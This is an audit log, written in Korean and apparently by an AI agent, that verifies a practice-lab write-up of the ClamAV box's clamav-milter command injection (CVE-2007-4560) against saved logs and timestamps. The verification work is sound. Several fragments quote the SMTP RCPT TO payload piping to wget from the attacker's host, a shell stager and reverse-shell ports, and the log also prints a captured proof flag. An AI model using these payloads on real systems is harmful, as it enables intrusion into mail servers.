---
tags:
  - type/audit
  - platform/pg
---
# ClamAV.md 적대적 검증 — 2026-08-20

검증자와 수정자를 한 사이클로 수행. 초고 493행 → 654행.

## 0. 증거원

| 종류 | 사용한 것 |
|---|---|
| **(A) git 원본** | **baseline 없음.** `git log -- "03. PG/ClamAV.md"` 가 0건. 노트는 미커밋 신규 파일이라 개작 전후 대조가 불가능하다. 산출물 대조로만 판정했다 |
| **(B) Kali 실측** | `~/PG/ClamAV/` 전량 — `nmap.log`·`nmap.full.txt`·`quick.log`·`svc.log`·`smtp_probe1.txt`·`clamex.py`·`www/{s,p,d,q}.sh`·`try1`~`try17`·`http_stager.log`·`listener443.log`·`shell_session.log`·`proof.txt`·`http_root.txt`·`web_binary_decoded.txt`·`smb_shares.txt`. 전 파일 mtime(`--time-style=full-iso`) |
| | `~/.zsh_history` — ClamAV 관련 항목 **0건**. 이 세션은 비대화형 SSH 로 돌아 기록이 안 남았다(예상된 공백, 부재 증거로 쓰지 않았다) |
| | `find /home/kali /tmp` 전역 grep — try15 의 64자 문자열을 담은 파일은 `try15_lenprobe.log` **하나뿐** |
| | `tmux ls` — clamav 세션 잔존 없음(현재 `fow_*` 만) |
| **(C) 1차 사료** | NVD CVE-2007-4560 · Kali 로컬 Metasploit 모듈 소스 `/usr/share/metasploit-framework/modules/exploits/unix/smtp/clamav_milter_blackhole.rb` |
| **스크린샷** | 볼트 `파일보관\` 에 ClamAV 관련 파일 **0건**. 노트도 스크린샷을 참조하지 않아 모순 없음 |

## 1. 고친 것

| 위치(문자열) | 무엇이 틀렸나 | 어떻게 고쳤나 | 근거 |
|---|---|---|---|
| frontmatter `tech/mail/smtp` · `tech/injection/command` | **볼트에 존재하지 않는 태그.** 전 볼트 grep 결과 이 두 문자열은 ClamAV.md 에서만 나온다. 시험장에서 `#tech/svc/smtp` 로 검색하면 이 노트가 **안 걸린다** | `tech/svc/smtp` · `tech/rce/cmd-injection` 으로 교체 | `grep -rn` 전 볼트. 같은 부류인 [[Bratarina]] 가 정확히 이 두 태그를 쓴다 |
| 1장 `### 서비스 식별` EICAR 블록 | "EICAR 를 먼저 던져 milter 를 확인하고 → 그 다음 RCE 확정"이라는 **2단계 서사**. 그런 2단계는 없었다. 인용된 `>>> DATA`~`554` 는 `try1.log` 의 일부이고, 같은 메시지가 `PROBE1` 도 실어 날랐다. 게다가 `>>> Subject: test` 와 빈 줄을 말없이 뺐다 | 실제 1단계인 `smtp_probe1.txt`(14:23:33, `:` 형태·DATA 미전송·명령 미실행)를 복원하고, EICAR/RCE 는 3장의 `try1.log` 전문 한 블록으로 통합 | `smtp_probe1.txt`(mtime 14:23:33) · `try1.log`(14:25:19) · `http_stager.log` 첫 히트 14:25:18 |
| 1장 nmap 블록 `as: nmap -sCV ...` | 실행 커맨드라인을 손봄 | 원문 `as: /usr/lib/nmap/nmap --privileged -sCV ...` 복원. `clock-skew` 줄도 추가(4시간 스큐의 근거) | `nmap.log` 1행 |
| 1장 웹·SMB 절 | 정찰 단계에 배치돼 "25번이 먼저 답을 줬다"로 마무리 | mtime 이 `http_root.txt` 14:42:20, `smb_shares.txt` 14:42:22, `web_binary_decoded.txt` 14:44:00 — root 획득(14:35)보다 **뒤**다. 절 제목과 도입에 "셸을 잡은 뒤에 본 것"을 명시 | `ls -la --time-style=full-iso` |
| 2장 clamav 조건 확인 블록 | `sh-2.05b#` 프롬프트 **3개로 재구성**해 세 번 따로 친 것처럼 보이게 함. 실제로는 복합 명령 2회 | `shell_session.log` 원문 그대로 복원(`dpkg -l` 4행 포함) | `shell_session.log` |
| 2장 `|` 해설 "프로그램 배달을 뜻하는 문자" | **잘못된 인과.** 이 CVE 는 `popen` 문자열이 셸에 넘어가는 결함이다. `|` 는 셸 파이프이지 sendmail 의 `\|command` 별칭 배달이 아니다 | "`popen` 이 넘긴 문자열 안의 셸 파이프"로 정정 | NVD 원문("shell metacharacters that are used in a certain popen call") |
| 2장 `"..."` 해설 "인용을 빼면 RCPT 단계에서 거절된다" | **시험한 적 없는 단정.** 인용 없는 형태를 보낸 로그가 17개 중 0개 | 인용의 두 역할(SMTP 문법 + 셸 인용 여닫기)로 다시 쓰고 `[가정]` 부착, "시험하지 않았다" 명시 | `try1`~`try17`·`smtp_probe1` 전량에 인용 없는 시도 없음 |
| 4장 증거 블록 | 실행 명령에서 `date;` 를 빼고, `ls -la /root /home` 출력을 **말없이 2행으로 압축** | 원문 복원(`date` 출력·`/root` 전체 목록 포함). `/root/.ssh` 존재가 드러난다 | `shell_session.log` |
| 5장 플래그 블록 | `clear;` 를 뗌 | 원문 복원 | `proof.txt` |
| 5장 | 플래그가 어느 인스턴스 값인지 표기 없음 | `[!warning]` 한 개 추가 — 2026-08-20 인스턴스, PG 는 재기동마다 재생성([[Flu]] 실측) | 지시된 확정 사실 |
| 5장 `ip a` 대신 ifconfig | 추론인데 표기 없음 | `[가정]` 부착 | — |
| 6장 (2) 소스포트 `32823` | **틀린 값** | `32803` | `listener443.log` |
| 6장 (2) "세 번 다 이 유령 연결이 먼저 붙었다" | 그 시점(14:32~14:34)의 443 리스너 로그가 없다. `listener443.log` 는 mtime 14:29:26 으로 그 **이전** 리스너다 | 인과를 `[가정]` 으로 강등하되 근거 3개를 명시(재배달 wget 실재 / `nc -lvnp` 는 `-k` 없이 1연결 종료 / p.sh·q.sh 가 포트만 다른데 4444 는 즉시 성공). 큐 3건과 `grep -c wget`=4 원문 블록 추가 | `listener443.log` mtime · `shell_session.log` 의 mqueue·PS 블록 |
| 6장 (3) "설명이 완결되지 않았다" | 틀린 건 아니지만 시험장에서 쓸 게 없다 | 파이프라인 서브셸 가설(`;` 가 `\|` 보다 결합이 약해 `cd` 가 파이프라인 오른쪽 서브셸로 들어가 버려짐)로 관측 넷을 설명. `[가정]` 유지, `@localhost` 처리는 "확인하지 않았다"로 남김 | 관측 4개(cd 무효·상대경로 성공·절대경로 무반응·try16 체이닝 정상) |
| 6장 (3) 작업 디렉터리 | 관측만 있고 근거 없음 | Metasploit 모듈 주석이 1차 사료로 확인 — "This directory is the clamav-milter process working directory", 페이로드가 `sh msg*` 상대경로 | `clamav_milter_blackhole.rb` |
| 6장 (4) `"GET /0123...0123 HTTP/1.0" 404 -` | **코드펜스 안에 실측 로그로 제시했으나 대응 산출물이 없다.** `http_stager.log` 는 14:34:53(`GET /q.sh`)에서 끝나고 try15 는 14:37:31. Kali 전역 grep 결과 이 문자열을 가진 파일은 `try15_lenprobe.log`(보낸 쪽)뿐 | 코드펜스 밖 산문으로 이동, "살아 있는 tmux 페인에서 읽었고 로그는 저장하지 않았다"를 명시. 대신 **보존된 반증 증거인 `try7`** 을 앞세움 | 아래 §3 참조 |
| 6장 시간표 | 14:24 EICAR 라는 없는 사건, 웹·SMB 누락 | mtime 기준으로 재작성(12행, 산출물 열 추가). 14:23:33 프로브·14:37~39 채널 계측·14:42~44 사후 열거 추가 | 전 산출물 mtime |
| 6장 (신규) 17발 대조표 | 초고는 `try*.log` 17개 중 **6개만** 반영 | `smtp_probe1` + `try1`~`try17` 전량을 「주입한 명령 / 길이 / `.` 이후 응답 / 결과」 표로. 이게 이 노트의 검색 본체다 | `try*.log` 전량, 길이는 실제 문자열 계산 |
| 6장 (신규) 응답 3분기 | 없던 관측 | `554` · `250 accepted` · 무응답 셋 다 명령이 실행됐다(try1·try13·try14 로 각각 확인). 무응답 = 명령이 아직 도는 중 | `try1`·`try13`+`http_stager.log`·`try14`+`shell_session.log` |
| 6장 (신규) 큐 ↔ 무응답 대응 | 없던 관측 | 무응답으로 끝난 try2(05:26)·try4(05:28:51)·try5(05:29:15) 셋이 mqueue 의 `df*` 3건(05:26·05:29·05:29)과 정확히 대응 | `try*.log` 배너 시각 · `shell_session.log` mqueue 목록 |
| 3장 clamex.py 인용 | `"X5O!P%@AP[4\\PZX54..."` 로 **역슬래시를 두 개로 고쳐** 인용 | 원문의 `\P` 복원. 이게 모든 로그 첫 줄의 `SyntaxWarning: invalid escape sequence '\P'` 의 출처라는 설명 추가 | `clamex.py` |
| 7장 4번 | 수동 대안이 `clamex.py`/손타이핑 둘뿐 | 모듈이 쓰는 `From:` 헤더 + `sh msg*` 무다운로드 기법 추가. **"이 박스에서는 시도하지 않았다, 근거는 모듈 소스 주석"** 명시 | `clamav_milter_blackhole.rb` |
| 8장 버전 | `0.91.2` 만 제시 | NVD(`before 0.91.2`)와 Rapid7(`prior to v0.92.2`)이 다르게 적는다는 사실을 한 줄로 병기 | 양쪽 원문 |

## 2. 삭제한 것

**본문 삭제 0건.** 전부 정정·강등·복원으로 처리했다. 코드펜스에서 산문으로 옮긴 것 1건(6장 (4)의 HTTP 로그 한 줄)이 유일한 형식 변경이며, 원문 문자열은 그대로 살려 뒀다. 되살리려면 아래를 코드펜스로 되돌리면 된다:

```
"GET /0123456789012345678901234567890123456789012345678901234567890123 HTTP/1.0" 404 -
```

(단 이 줄에 대응하는 산출물은 Kali 어디에도 없다. 되살릴 때는 그 사실을 함께 적어야 한다.)

## 3. 내가 지적했다가 다시 반증한 것 — 노트가 옳았다

검증 절차 자체의 정확도를 판단할 수 있게 전부 적는다.

**(가) "93자 절단은 근거가 없다" → 반증. 노트가 옳다.**
`http_stager.log` 가 try15 를 못 덮는 것을 보고 처음엔 근거부족으로 분류했다. 그런데 보존된 `try7.log` 가 독립 증거였다. try7 페이로드는 105자이고 세 번째 명령 `/usr/bin/wget .../zzz` 가 67번째 문자에서 시작한다. `http_stager.log` 14:31:04 에는 `GET /aaa` 만 있고 `GET /zzz` 가 **없다**. 93자에서 자르면 그 자리는 `/usr/bin/wget http://192.16` 이라 URL 이 깨진다 — 관측과 일치한다. 산술도 맞는다: try15 prefix `/usr/bin/wget 192.168.45.207/` = 29자, 29 + 64 = 93. 그래서 **절단 사실은 확정**이고, 64라는 계측치만 재확인 불가로 표기했다.

**(나) "타겟 `date` 05:41 과 Kali mtime 14:41 이 모순" → 반증.**
타겟 시계가 4시간 앞서 있다. nmap 이 `clock-skew: median: 3h59m59s` 로 독립 기록했다. 14:35 KST = 01:35 EDT, 타겟은 05:35 EDT. 미환산 오판을 막으려고 이 설명을 노트 1장·4장·6장 시간표 셋에 박아 뒀다.

**(다) "소문자 접힘" → 확정. 노트가 옳다.** `try1.log` 는 `PROBE1` 을 보냈고 `http_stager.log` 는 `GET /probe1` 을 받았다.

**(라) "`cd` 무효 / milter 작업 디렉터리" → 확정.** `shell_session.log` 의 `find` 결과가 4개 파일을 전부 `/tmp/clamav-<hash>/` 에서 찾았다. Metasploit 모듈 주석이 같은 사실을 1차 사료로 말한다.

**(마) "`dpkg` 0.84 vs 실행 0.91" → 확정.** `shell_session.log` 에 둘 다 원문으로 있다.

**(바) "아웃바운드 차단 없음" → 확정.** 80(`http_stager.log`) · 443(`listener443.log`) · 4444(`shell_session.log`) 전부 도달 기록이 있다.

**(사) "`try9`·`10`·`12` 가 3회 실패했다" → 확정(횟수는 맞다).** 실패 **원인**만 `[가정]` 으로 강등했다. 노트가 지어낸 건 아니다.

**(아) 플래그가 웹셸이 아닌지** — 라인 관리자가 이미 통과 처리했고 재검증하지 않았다. 다만 노트가 `proof.txt` 원문에서 `clear;` 를 뗀 것은 확인해 복원했다.

## 4. 총괄 판단이 필요한 것

**(1) `extract.py` 가 60000/tcp 를 버린다 — 공유 인프라, 손대지 않았다.**
검증 도중 다른 세션이 색인 파이프라인을 돌렸고 프론트매터가 재생성됐다. 그 결과 `ports` 에서 **60000 이 사라졌다**(`[22, 25, 80, 139, 199, 445]`). 49152 이상 제외 규칙(Windows 동적 RPC 대비)에 걸린 것으로 보인다. 그런데 이 박스의 60000 은 **정적으로 열린 두 번째 sshd** 이고 노트가 `-p-` 교훈의 근거로 삼는 포트다. `ports` 에 없으면 "고포트에 서비스가 있던 박스"를 나중에 못 찾는다. 나는 노트 프론트매터에 60000 을 되돌려 놨지만 **다음 `refresh.ps1` 이 다시 지운다.** Linux 박스에서는 상한을 두지 않거나 예외 목록을 두는 쪽을 검토해달라.

**(2) 동시 편집 사고 1건.** 작업 중 `Write` 가 "file has been modified" 로 한 번 거부됐다. 내 편집은 유실되지 않았지만, 색인 파이프라인이 검증 중인 노트의 프론트매터를 덮어쓸 수 있다는 뜻이다. 지시대로 `refresh.ps1` 은 돌리지 않았다.

**(3) 저장되지 않은 산출물.** try15~17 을 덮는 HTTP 서버 로그가 없다. 타겟이 꺼져 재현 불가라 이 항목은 영구히 "재확인 불가"로 남는다. `_STATUS.md` 는 지시대로 건드리지 않았다.

## 5. 수치

| | |
|---|---|
| 행수 | 493 → 654 (+161. 정정 이력 콜아웃 +23, 17발 대조표 +22, 복원한 터미널 원문 +약 40, 6장 확충 나머지) |
| 정정 | 22항목 |
| `[가정]` 강등 | 4건 (인용 필요성 · 유령 wget 인과 · `cd` 무효 메커니즘 · `ip a` 부재) |
| 코드펜스 → 산문 | 1건 |
| 삭제 | 0건 |
| 터미널 블록 원문 복원 | 5건 (nmap `as:` · 2장 clamav 확인 · 3장 clamex.py `\P` · 4장 반사명령 · 5장 플래그) |
| 신규 실측 블록 | 4건 (`smtp_probe1` · `try1` 전문 · mqueue/PS · listener443 전문) |
| 프론트매터 최종 | `tags:` type/machine · platform/pg · os/linux · status/solved · **tech/svc/smtp · tech/rce/cmd-injection · tech/payload/revshell** / `ip: 192.168.248.42` / `domain: 0xbabe.local` / `ports: [22,25,80,139,199,445,60000]` / `services: [http,netbios-ssn,smtp,smux,ssh]` / `cves: [CVE-2007-4560]` / `status: solved` / `manual_tags: true` / `manual_cves: true` (둘 다 **주석 없음**) / `tech_count: 3` |

## 본문에서 이관한 정정 이력

(2026-08-20 이관 — 원래 `ClamAV.md` 프론트매터 직후 상단에 있던 블록. 원문 그대로.)

> [!warning] 적대적 검증 정정 이력 (2026-08-20)
> 초고를 `~/PG/ClamAV/` 산출물 전량과 대조해 아래를 고쳤다. 터미널 블록은 전부 원문으로 되돌렸다. 전체 대조는 `_AUDIT/ClamAV-audit.md`.
>
> | 위치 | 무엇이 틀렸나 | 어떻게 고쳤나 |
> |---|---|---|
> | frontmatter | `tech/mail/smtp`·`tech/injection/command` 는 볼트에 없는 태그였다 (이 노트가 처음 만든 것) | 표준 태그 `tech/svc/smtp`·`tech/rce/cmd-injection` 로 교체. [[Bratarina]] 와 같은 태그가 돼야 검색에 걸린다 |
> | 1장 EICAR 절 | "EICAR 로 먼저 확인하고 그 다음 RCE 를 확정했다"는 2단계 서사 | 같은 메시지 하나였다(`try1.log`, 14:25:19). EICAR 응답과 `GET /probe1` 이 동시에 왔다. 진짜 1단계는 `smtp_probe1.txt`(14:23:33) 다 |
> | 1장 nmap 블록 | `as: nmap -sCV ...` 로 손봄 | 원문은 `as: /usr/lib/nmap/nmap --privileged -sCV ...` |
> | 1장 웹·SMB | 정찰 단계에 배치 | mtime 상 14:42~14:44, root 를 잡은 뒤다. 사후 확인임을 명시 |
> | 2장 clamav 확인 블록 | 실제로는 두 번의 복합 명령인데 `sh-2.05b#` 프롬프트 3개로 재구성 | `shell_session.log` 원문 그대로 복원 |
> | 2장 페이로드 해설 | "`\|` 는 프로그램 배달 문자" / "인용을 빼면 RCPT 에서 거절된다" | `\|` 는 `popen` 문자열 안의 셸 파이프다. 인용 없는 형태는 시도한 적이 없어 `[가정]` 으로 강등 |
> | 4·5장 증거 블록 | 실행한 명령에서 `clear;`·`date;` 를 빼고 `ls` 출력을 말없이 줄임 | 원문 복원 |
> | 6장 (2) | 콜백 소스포트 `32823` | `listener443.log` 원문은 `32803` |
> | 6장 (2) | "세 번 다 유령 연결이 먼저 붙었다" | 그 시점 리스너 로그가 없다. 유령 wget 의 존재는 증거가 있으나(큐 3건, `grep -c wget`=4) 3회 모두라는 인과는 `[가정]` |
> | 6장 (3) | "`cd` 가 왜 안 먹는지 설명이 완결되지 않았다" | 파이프라인 서브셸 가설로 관측 넷을 설명. 여전히 `[가정]` 이되 근거를 붙였다. 작업 디렉터리가 milter 임시 디렉터리라는 것은 Metasploit 모듈 주석이 뒷받침 |
> | 6장 (4) | `"GET /0123...0123"` 을 실측 로그 블록으로 제시 | try15 를 덮는 HTTP 로그가 저장돼 있지 않다(`http_stager.log` 는 14:34:53 에서 끝난다). 코드펜스 밖으로 빼고, 보존된 반증 증거인 `try7.log` 를 앞세웠다 |
>
> 지적으로 올랐다가 **노트가 옳아서 되살린 것**: 소문자 접힘 · `cd` 무효 · `dpkg` 0.84 vs 실행 0.91 · 아웃바운드 차단 없음 · 93자 절단 — 다섯 항목 모두 산출물이 뒷받침한다.

---

# 웨이브 9 적대적 검증 — 2026-08-26 (OSCP 보고서 형식 개작본)

대상: `03. PG\ClamAV.md` 635행(`_backup\ClamAV.md.bak`) → 510행 개작본. 검증+정정 한 사이클.
위 2026-08-20 감사는 **옛 0~9장 구조**에 대한 것임. 이 절은 그 뒤 2026-08-24 템플릿 전환분에 대한 별건 감사임.

## 0. 증거원

| 종류 | 사용한 것 |
|---|---|
| **(A) git 원본** | `_backup\ClamAV.md.bak`(635행)과 전문 diff. git baseline 은 여전히 없음(노트가 미커밋 신규였음 — 위 2026-08-20 절 기록) |
| **(B) Kali 실측** | `~/PG/ClamAV/` 전량 재독 — `nmap.log`·`quick.log`·`svc.log`·`nmap_tmux.log`·`smtp_probe1.txt`·`clamex.py`·`www/{s,p,d,q}.sh`·`try1`~`try17`·`http_stager.log`·`listener443.log`·`shell_session.log`·`proof.txt`·`http_root.txt`·`web_binary_decoded.txt`·`smb_shares.txt` + 전 파일 `--time-style=full-iso` mtime |
| | `~/.zsh_history` — ClamAV 항목 **0건**(비대화형 SSH 세션. 노트에 Kali 프롬프트가 0회인 것과 정합) |
| | 볼트 `파일보관\` — ClamAV 관련 **0장**. 노트가 「스크린샷 없음」이라고 명시해 모순 없음 |
| | `03. PG\_AUDIT\portal-진행도-실측-20260820.md` — ClamAV 행 **없음**(그 조사가 ClamAV 풀이와 같은 날짜라 미수록) |
| **(C) 1차 사료** | `_INDEX\_tools\build_index.py`·`extract.py`·`_INDEX\01. 기법별 색인.md`(태그 taxonomy 정본). NVD/Rapid7 표기는 위 절에서 이미 확인됨 |

## 1. 고친 것

| 위치(문자열) | 무엇이 틀렸나 | 어떻게 고쳤나 | 근거 |
|---|---|---|---|
| 「채널 제약 셋」 도입 — `10분 12초가 전부 이 셋을 몰라서 생긴 것이고` | **잘못된 인과.** try9·try10·try12(14:32:56~14:34:18)는 `cd /tmp;/bin/sh p.sh` — 상대경로 20자 소문자로 **세 제약을 전부 만족**한 상태에서 실패했음. 개작 전 원문은 「채널 제약」을 (1)~(5) 다섯 항목의 총칭으로 썼는데, 개작이 3행짜리 표로 좁히면서 **범위는 줄고 단정은 그대로 남아** 자기 산출물에 반박당하는 문장이 됨 | 「10분 12초가 걸렸고, 그중 앞의 약 7분(14:25~14:32)이 이 셋을 몰라서 생긴 것」으로 정정. 남은 3분은 아래 신설 문단으로 회수 | `try8.log` 14:32:05(상대경로 성공) ↔ `try9/10/12.log` 14:32:56·14:33:31·14:34:18 의 `RCPT TO` 원문 |
| 같은 절 (신설 문단) | 개작이 443 구간을 통째로 들어내 **10분의 회계가 닫히지 않음.** 「방화벽 문제는 하나도 없었음」의 근거도 본문에서 사라짐 | 「남은 약 3분은 채널 제약이 아님 — perl→443 3회 실패, 포트만 4444 로 바꾸자 즉시 성공」 + 큐 잔존 wget 인과를 `[가정]` 으로 + egress 80·443·4444 도달 근거 3개 명시 + `[[_PLAYBOOK#A-31]]` 앵커 | `listener443.log`(443 도달) · `http_stager.log`(80) · `shell_session.log`(4444 접속 헤더) · `www/p.sh` vs `www/q.sh` 는 포트 문자열만 다름 |
| `http_stager.log 는 tmux capture-pane 스냅샷(14:36:20)이라` | **미검증 메커니즘 단정.** `capture-pane` 으로 떴다는 기록이 어디에도 없음(`~/.zsh_history` 0건) | 관측 가능한 사실로 교체 — 「내용이 14:34:53 에서 끝나는데 파일 mtime 은 14:36:20 — 실시간 추가 기록이 아니라 한 번 떠낸 스냅샷임」. 결론(그 이후 요청 부재 → 93자 직접 계측치 재확인 불가)은 그대로 유지 | `http_stager.log` 마지막 줄 시각 vs mtime |
| `find /` 블록 출처 캡션 | 펜스 안 명령이 `echo ---PWD---; ls -la /var/lib/clamav` 까지 담고 있는데 **그 출력만 말없이 잘려** 있었음(개작 전부터 있던 것) | 캡션에 「`---PWD---` 이후의 `/var/lib/clamav` 목록은 잘랐음」 추가. 같은 노트 nmap 블록의 관례와 동일 | `shell_session.log` 84~96행 |
| `_AUDIT\ClamAV-playbook.md` §5 | **이관 손실 1건** — 옛 0장 다섯째 항목(시험 출제 가능성 = 부류 전이 + 보조 데몬)이 노트·제안·`_PLAYBOOK` **어디에도 없었음** | 제안 §5(B-2 신규 카드) 본문에 「시험에 전이되는 것 — CVE 번호가 아니라 부류임」으로 넣고, 「지우기 전 원문」에 원문 인용 + 누락 사실 표기 | `_backup\ClamAV.md.bak` 옛 0장 · 세 파일 전수 grep(`보조 데몬`·`프린터`·`반사신경` 전부 0건) |

## 2. 삭제한 것

**0건.** 정정 3 · 신설 1 · 캡션 보강 1 · 이관 보완 1. 실측 블록·프롬프트·값은 한 바이트도 손대지 않음.

## 3. 내가 지적했다가 다시 반증한 것 — 노트/작성자가 옳았다

**(가) frontmatter `tech/web/cmd-injection` 오분류 — 작성자 보고가 틀렸음. 현재 태그가 맞다.**
작성자가 「실제는 SMTP `RCPT TO` 인데 `web` 으로 분류됐다」고 보고했고, 2026-08-20 감사도 `tech/rce/cmd-injection` 을 권고했었음. **둘 다 틀렸음.** taxonomy 정본을 직접 확인한 결과:

- `_INDEX\_tools\build_index.py:65` — `"tech/web/cmd-injection": ("명령어 인젝션", "쉘 메타문자로 직접 실행")`
- `_INDEX\01. 기법별 색인.md:309` — `### 명령어 인젝션  #tech/web/cmd-injection`
- `tech/rce/cmd-injection` 은 `03. PG\` 본체 노트 **0건** — `_AUDIT`·`_backup` 에만 남은 사문(死文)임
- 형제 박스 [[Bratarina]](OpenSMTPD, 역시 SMTP 주소 필드)도 현재 `tech/web/cmd-injection` 을 씀

`web/` 은 **taxonomy 네임스페이스**지 「HTTP 로 들어왔다」는 주장이 아님. 바꾸면 `#tech/web/cmd-injection` 색인에서 이 노트만 빠짐. **손대지 않았음.**

**(나) 「무응답 3건 = 큐 `df*` 3건 정확히 일치」가 반증됐다는 작성자 주장 — 맞음.**
`.` 이후 무응답은 try2(05:26)·try4(05:28)·try5(05:29)·try7(05:31)·try14(05:35) **5건**. `shell_session.log` 의 mqueue 목록은 05:39 시점 캡처인데 `df*` 는 **3건**(05:26·05:29·05:29)뿐 — try7·try14 는 그 전에 보냈는데도 큐에 없음. 원문의 `[!danger]` 는 성립 안 함. (try3 은 `.` 을 못 보냈으므로 「`.` 이후 무응답」에 안 들어감 — 5건 계산이 맞다.)

**(다) `try5` 길이 51→44 정정 — 맞음.** `try5.log` 의 `RCPT TO: <nobody+"|/usr/bin/wget http://192.168.45.207:443/p443"@localhost>` 에서 `|` 제외 = **44자**. 나아가 **17건 전량을 재계산해 전부 일치 확인**함(try1 42 · try2/4/6 66 · try7 105 · try8/9/14 20 · try13 41 · try15 229 · try16 65 · try17 76).

**(라) 「15분 안에 RCE」→ 2분 43초 — 맞음. 타임존 환산도 정확함.**
`nmap.log` 헤더 `Thu Aug 20 14:22:36 2026` 은 **Kali 로컬(KST)** 이고 `try1.log` mtime 14:25:19 도 KST — 같은 기준선이라 환산 불필요. 로그 「본문」의 `05:24:30 -0400` 은 타겟 시계이며 노트가 별도로 4시간 스큐를 설명함. 미환산 오판 없음.

**(마) 「93자 절단」 → 노트가 옳다.** try7 105자, 세 번째 명령은 67번째 문자에서 시작. `http_stager.log` 14:31:04 에 `GET /aaa` 만 있고 `GET /zzz` 없음. 93자 커트 시 그 자리가 `/usr/bin/wget http://192.16` 이라 URL 이 깨짐 — 관측과 일치.

**(바) `http_root.txt` 인용 블록의 줄바꿈 — 노트가 옳다(개작이 「고친」 것).**
처음엔 개작이 이진 문자열을 2행으로 쪼갠 것을 실측 훼손으로 의심했음. 확인 결과 **산출물 원본 15행이 178자에서 실제로 끊겨 있고 16행에 `0000 01100010` 이 있음.** 오히려 옛 원문이 한 줄로 이어붙여 놨던 것. 개작이 원문에 맞춘 것임.

**(사) egress 서술 — 반박 없음.** 노트는 「아웃바운드 tcp/80 이 열려 있음」만 적고 **「80만 허용」류 단정이 없음.** `listener443.log`(443 도달)와 충돌하지 않음. Cobbles 형 사고 아님.

**(아) 「스크린샷 없음」 — 노트가 옳다.** `파일보관\` 에 `PG-ClamAV-*` 0장, 2026-08-20 자 `Pasted image` 0장. 노트가 그 사실과 「정지 뒤에는 되살릴 방법이 없음」을 명시.

**(자) `Privilege Escalation` 에 4항목이 없다 → 지적 철회.**
이 박스는 권한상승 **finding 자체가 없음**(milter 가 root). 없는 finding 에 4항목을 만들면 심사관에게 허위 항목이 됨. 절 제목이 사유를 담고 본문이 `ps aux` 원문 + `GET /uid=0-root` 실측으로 근거를 대고 있어 **통과로 판정**함.

## 4. 검증 항목별 판정

| | 항목 | 판정 |
|---|---|---|
| ⓐ | 4항목 · `PrivEsc 없음` 근거 | **통과.** `Initial Access` 4항목 완비. 두 `Initial Access` 제목 상이(긴 서술형 / 짧은 재현형)는 [[Robust]]·`_WRITEUP-STANDARD` 템플릿과 **동일 구조**임 — 결손 아님 |
| ⓑ | 코드펜스 = 산출물 원문 | **통과.** 표본 **12블록** 바이트 대조(nmap.log · try1.log · smtp_probe1.txt · shell_session.log ×4 · clamex.py · www/d.sh · www/q.sh · http_root.txt · web_binary_decoded.txt · smb_shares.txt · proof.txt). 전부 일치. 잘라낸 곳은 전부 캡션에 명시(마지막 1건은 이번에 보강) |
| ⓒ | 이관 손실 0 | **1건 발견 → 보완 완료.** 옛 0장 5번째 항목. 그 외 125행 감소분은 전부 제안 9건에 귀속 확인. 옛 6장 「시간」 12행 표는 제안이 「`.bak` 562~575행 보존」으로 **명시 선언**하고 요지만 옮김 — 선언된 부분 이관이라 손실로 세지 않음 |
| ⓓ | nmap raw · 60000/tcp | **통과.** `60000/tcp open  ssh …` 원문 보존(88행). `PORT_RE` 대상 7줄 전량 생존. `ports: [22, 25, 80, 139, 199, 445, 60000]` 도 유지 |
| ⓔ | pty 프롬프트 | **통과.** `sh-2.05b#` **8회 전량 보존**(하나도 지우지 않음). Kali 프롬프트 `┌──(kali㉿kali)` **0회** — 창작 없음. `~/.zsh_history` 0건이 비대화형 세션임을 뒷받침 |
| ⓕ | 자기 산출물에 반박당하는 곳 | **1건**(위 「10분 12초 전부 이 셋」). egress 서술은 반박 없음 |
| ⓖ | **버전 이원화** | **통과 — 둘 다 생존.** `dpkg -l` 0.84-2.sarge.1 **4행**(111~114행) + `ClamAV version 0.91, clamav-milter version 0.91` **1행**(122행)이 같은 `Service Enumeration` 블록에 나란히 있음. 「`dpkg` 만 봤으면 0.91.2 미만 범위 밖으로 잘못 배제」 해설도 유지(134행) |
| ⓗ | 작성자 자칭 반증 5건 | **5건 전부 진짜 반증.** 위 §3 (나)(다)(라) + `settimeout` `[가정]` 강등(clamex.py mtime 14:28:42 가 try3 14:27:57 ↔ try4 14:29:02 사이 — 관측은 맞고 「수정 내용」은 확정 불가라 강등이 정확) + `Destination Host Unreachable` `[가정]` 강등(대응 산출물 없음). **창작 아님** |

## 5. 총괄 판단이 필요한 것

1. **frontmatter 는 손대지 않았고, 손댈 필요도 없음.** 작성자의 `tech/web/cmd-injection` 오분류 지적은 **반증됨**(위 §3 (가)). 오히려 2026-08-20 감사가 권고한 `tech/rce/cmd-injection` 이 taxonomy 에 없는 태그임 — **다른 노트에도 같은 권고가 상속됐는지 점검이 필요**할 수 있음(`_AUDIT\PwnLab-run.md`·`wave7-audit.md` 에 같은 문자열이 있음).
2. **색인 갱신 필요**(본문 변경 5건). `refresh.ps1` 은 지시대로 **돌리지 않음.**
3. **포털 `0/1` 표기**(노트 424행, 플래그 1개 근거 ②)는 고정 출처로 **독립 확인 불가** — `portal-진행도-실측-20260820.md` 에 ClamAV 행이 없음(같은 날 풀린 박스라 미수록). 근거 ①(`find / -name local.txt` 0건 + `NOLOCAL-DONE`)은 `shell_session.log` 로 확정되므로 **결론은 흔들리지 않음.** 표기를 남겨 둠.
4. **`_PLAYBOOK` 반영은 여전히 미실행** — 제안 9건 + 이번 보완 1건. 신규 3건 번호 배정과 `ClamAV.md ## 관련` 앵커 추가가 남아 있음(`ClamAV-playbook.md` 「반영 후 할 것」).
5. **`_STATUS.md` 판정**: ClamAV = **완료 1/1**(`/root/proof.txt` = `9e16b9729fc839292f26d8d0b1e0d89f`, 대화형 pty 셸 `sh-2.05b#` 에서 원위치 `cat`, 웹셸 아님). 직접 편집하지 않았음.

## 6. 수치

| | |
|---|---|
| 행수 | 510 → **512** (+2) |
| 정정 | 3건 (인과 오류 1 · 미검증 단정 1 · 캡션 누락 1) |
| 신설 | 1건 (443 구간 회수 문단 — `[가정]` 포함) |
| 이관 보완 | 1건 (`ClamAV-playbook.md` §5) |
| 삭제 | **0건** |
| 강등 | 0건 (신설 문단에 `[가정]` 1개 신규 부착) |
| 자기 지적 반증 | **9건**(§3 가~자) |
| `sh-2.05b#` 잔존 | **8회** (개작 전과 동일, 손실 0) |
| Kali 프롬프트 창작 | **0회** |
| 60000/tcp raw | **생존** |
| 버전 이원화(0.84 ↔ 0.91) | **둘 다 생존** |
| 문체 이관 | **0건** (`pg-doc-reviewer` 로 넘길 건 없음) |
